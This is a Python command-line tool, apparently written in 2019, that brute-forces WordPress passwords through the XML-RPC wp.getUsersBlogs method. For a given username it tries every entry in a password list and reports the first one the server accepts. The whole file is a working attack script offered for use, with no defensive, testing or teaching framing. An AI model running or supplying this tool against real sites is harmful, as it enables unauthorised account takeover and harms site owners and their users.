#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Author: Michael Hoefler
# @Date: 06/27/2019

# LIST METHODS : <methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall>

import requests, argparse


parser = argparse.ArgumentParser('WordPress XMLRPC brute force tool')

parser.add_argument('--url', help='The URL of the XMLRPC service', required=True, type=str)
parser.add_argument('--user', help='The username of the user to bruteforce', required=True, type=str)
parser.add_argument('--list', help='The path to the password list used for bruteforcing', required=True, type=str)
parser.add_argument('-v', action='store_true', help='Verbose output: shows incorrect passwords.', default=False)

args = parser.parse_args()


found = False

checked = 0

print('\nInitializing WordPress XMLRPC brute force tool with URL "{}"\n'.format(args.url))

for password in open(args.list, 'r', encoding='utf-8'):

    data = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>'.format(args.user, password.strip())

    while True:
        try:
            response = requests.post(args.url, data=data)
        except KeyboardInterrupt:
            print('[-] Exiting.')
            quit()
        except:
            print('[-] Network Error or Connection was Dropped, Retrying Password {}'.format(password.strip()))
            continue
        break

    checked += 1

    if ('Incorrect' not in response.text and 'parse error.' not in response.text):
        print('\n[*] Password Found : {}\n'.format(password.strip()))
        found = True
        break
    elif args.v == True:
        print('[-] Incorrect Password : {}'.format(password.strip()))
    else:
        if (checked % 50 == 0): print('Status : {} passwords checked. No matches found'.format(checked))



if not found: print('\n[-] No Valid Passwords Found... Exiting.\n')